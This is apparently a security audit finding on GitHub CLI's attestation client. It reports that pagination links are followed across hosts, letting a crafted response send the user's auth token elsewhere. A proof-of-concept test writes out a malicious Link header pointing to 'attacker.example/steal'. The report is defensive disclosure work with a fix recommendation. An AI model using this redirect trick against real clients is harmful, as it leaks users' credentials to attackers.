### Title
Cross-host pagination link in `RESTWithNext` bypasses host confinement, enabling token exfiltration to attacker-controlled host - (File: `pkg/cmd/attestation/api/client.go`)

### Summary
`getAttestations` follows the `next` pagination URL returned by `RESTWithNext` without verifying it stays on `c.host`. Because the underlying `api.Client.RESTWithNext`/`REST` treats a full URL passed as `p` as an absolute destination that overrides the `hostname` argument entirely, an attacker who controls the response of the configured GitHub host (including any GHES-like host the victim points `gh` at) can supply a `Link: <https://attacker.example/...>; rel="next"` header and cause the next request — issued by the same authenticated client — to be sent to `attacker.example`.

### Finding Description
In `getAttestations` (`pkg/cmd/attestation/api/client.go:155-165`), each loop iteration calls:
```go
newURL, restErr := c.githubAPI.RESTWithNext(c.host, http.MethodGet, pageURL.String(), nil, &resp)
...
pageURL = safeurl.NewImmutableSafeURL(newURL)
``` [1](#0-0) 

`newURL` is taken verbatim from the response's `Link` header (`rel="next"`) inside `RESTWithNext` [2](#0-1) . `safeurl.NewImmutableSafeURL` performs no validation — its own doc comment states it "renders url verbatim" and is "only safe to wrap a URL that was created from trusted components or received from a trusted source" [3](#0-2) , i.e. it explicitly does not enforce host confinement.

On the next loop iteration, `pageURL.String()` (now a full `https://...` URL potentially pointing to a different host) is passed as the `p` parameter to `RESTWithNext(c.host, ...)`. The existing test `TestRESTWithFullURL` confirms that when `p` contains `"://"`, the underlying `go-gh` REST client uses that URL as-is and the `hostname` parameter is effectively ignored for routing purposes:
```go
err = client.REST("example.com", "GET", "https://another.net/user/repos", nil, nil)
...
assert.Equal(t, "another.net", http.Requests[1].URL.Hostname())
``` [4](#0-3) 

This shows `c.host` is not enforced as a destination constraint once a full URL is supplied — the same pattern used by `getAttestations`. Since the REST client used to make this follow-up request is the same authenticated client instance configured with the user's token (via `clientOptions`/`ghAPI.NewRESTClient`), and the Authorization header is attached by that client to every request it issues regardless of the resolved destination host, the credential is not scoped to `c.host` at request time — it follows wherever the `next` URL points.

### Impact Explanation
This allows an attacker who controls (or can spoof) the content of the configured GitHub API host (e.g., a malicious or compromised GHES-like endpoint the victim has pointed `gh` at, or any host whose responses the attacker can influence) to redirect the victim's authenticated `gh attestation verify` request — carrying the victim's GitHub token — to an attacker-controlled server via a crafted `Link` header. This matches GitHub's "credential/token disclosure to unauthorized host" bounty impact class, since the token is sent to a host outside `c.host`/the user's configured trust boundary.

### Likelihood Explanation
Requires the victim to run `gh attestation verify` against a host under attacker influence (a compromised or malicious enterprise/self-hosted GitHub-like endpoint the user has configured, or an attacker able to tamper with responses from that host). Given that precondition, exploitation is trivial and fully repeatable: a single crafted `Link` response header is sufficient, no other user interaction is needed since pagination is automatic.

### Recommendation
Before dereferencing `newURL`, parse it and verify its host matches `c.host` (or an explicitly allow-listed API host, e.g. `api.<host>`), rejecting or stripping the pagination link otherwise. `safeurl.NewImmutableSafeURL` should not be used for untrusted `next` links without this check — a new helper (e.g. `safeurl.NewImmutableSafeURLWithHostCheck(host, url)`) should be introduced and used in `getAttestations`.

### Proof of Concept
```go
func TestGetAttestations_RejectsCrossHostNextLink(t *testing.T) {
    reg := &httpmock.Registry{}
    defer reg.Verify(t)

    reg.Register(httpmock.MatchAny, func(req *http.Request) (*http.Response, error) {
        assert.Equal(t, "victim-host.example", req.URL.Hostname(), "auth token must not be sent to attacker host")
        return &http.Response{
            Request:    req,
            StatusCode: http.StatusOK,
            Body:       io.NopCloser(bytes.NewBufferString(`{"attestations":[]}`)),
            Header: http.Header{
                "Content-Type": {"application/json"},
                "Link":         {`<https://attacker.example/steal>; rel="next"`},
            },
        }, nil
    })

    client := NewLiveClient(&http.Client{Transport: reg}, http.DefaultClient, "victim-host.example", logger)
    _, err := client.GetByDigest(FetchParams{Digest: "sha256:abc", Repo: "o/r", Limit: 30})
    // Expect: on the second page fetch, the request goes to attacker.example carrying
    // the Authorization header, which the assertion above catches and fails.
}
```
Expected result today: the assertion fails (request goes to `attacker.example` with the Authorization header attached), demonstrating the vulnerability. After the fix, `getAttestations` should detect the host mismatch and return an error instead of issuing the follow-up request.

// NewImmutableSafeURL returns an ImmutableSafeURL that renders url verbatim. Only pass
// a URL you built yourself from trusted components or received from a trusted source,
// such as a server response; this bypasses all percent-encoding, so passing a value
// that embeds unescaped user or third party input reintroduces the injection risk that
// SafeURL exists to prevent.
func NewImmutableSafeURL(url string) *ImmutableSafeURL {
	return &ImmutableSafeURL{url: url}
}
